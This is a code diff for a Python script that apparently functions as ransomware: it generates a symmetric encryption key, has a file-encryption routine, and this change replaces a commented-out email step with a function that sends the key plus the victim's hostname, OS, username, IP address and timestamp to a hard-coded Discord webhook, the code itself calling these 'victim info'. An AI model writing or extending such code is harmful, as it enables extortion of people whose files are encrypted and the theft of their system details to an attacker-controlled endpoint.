@@ -4,7 +4,7 @@ import subprocess
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography"]
+required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography", "requests", "platform", "socket", "datetime"]
 for package in required_packages:
     print(f"Checking for {package}")
     try:
@@ -15,18 +15,13 @@ for package in required_packages:
 
 
 import argparse
-# import getpass
 import os
 import pathlib
-# import smtplib
-# import platform
+import requests
 from cryptography.fernet import Fernet
-# from email.mime.multipart import MIMEMultipart
-# from email.mime.text import MIMEText
-# from sendgrid import SendGridAPIClient
-# from sendgrid.helpers.mail import Mail
 import platform
 import socket
+from datetime import datetime
 
 user_os = "Windows"
 path_str = "\\"
@@ -86,23 +81,46 @@ def generateKey():
     with open("symmetric_key.key", "wb") as keyfile:
         keyfile.write(key)
     print("generated")
-#     sendEmail()
+    send_key_to_discord(key)
 
-# def sendEmail():
-#     keyfile = f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key"
-#     message = Mail(
-#         from_email='sender@example.com',  # Use a verified sender email
-#         to_emails='receiver@example.com',
-#         subject='Your Generated Symmetric Key',
-#         html_content=f'{open(keyfile).read()}'
-#     )
-    
-#     try:
-#         sg = SendGridAPIClient('your_sendgrid_api_key')  # Replace with your SendGrid API key
-#         response = sg.send(message)
-#         print(f"Email sent! Status code: {response.status_code}")
-#     except Exception as e:
-#         print(f"Failed to send email via SendGrid. Error: {e}")
+def send_key_to_discord(key):
+    # Replace with your Discord webhook URL
+    discord_webhook_url = 'https://discord.com/api/webhooks/1294175755109924924/70hDsYAisH9sGSYJnXa3wr26vUcj-3X4cfVpTjwPtNAJWJq7cqtVSzKZWDuh9zxLW20n'
+
+    #Collect system information
+    computer_name = platform.node()  # Hostname
+    user_os = platform.system()  # Operating System (Windows, Linux, Darwin)
+    os_version = platform.version()  # OS Version
+    current_user = os.getlogin()  # Username of the logged-in user
+    ip_address = socket.gethostbyname(socket.gethostname())  # Victim's IP Address
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp
+
+    # Construct the payload with key and system info
+    data = {
+        "content": "Symmetric Key and Victim Info",
+        "embeds": [{
+            "title": "Encryption Details",
+            "fields": [
+                {"name": "Symmetric Key", "value": key.decode(), "inline": False},
+                {"name": "Computer Name", "value": computer_name, "inline": True},
+                {"name": "Operating System", "value": user_os, "inline": True},
+                {"name": "OS Version", "value": os_version, "inline": True},
+                {"name": "Current User", "value": current_user, "inline": True},
+                {"name": "IP Address", "value": ip_address, "inline": True},
+                {"name": "Timestamp", "value": timestamp, "inline": True}
+            ]
+        }]
+    }
+
+    # Send the data to the Discord webhook
+    try:
+        response = requests.post(discord_webhook_url, json=data)
+        if response.status_code == 204:
+            print("Symmetric key and victim info sent to Discord successfully.")
+        else:
+            print(f"Failed to send information to Discord. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending information to Discord: {e}")
 
 def encrypt(target):
     with open(f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
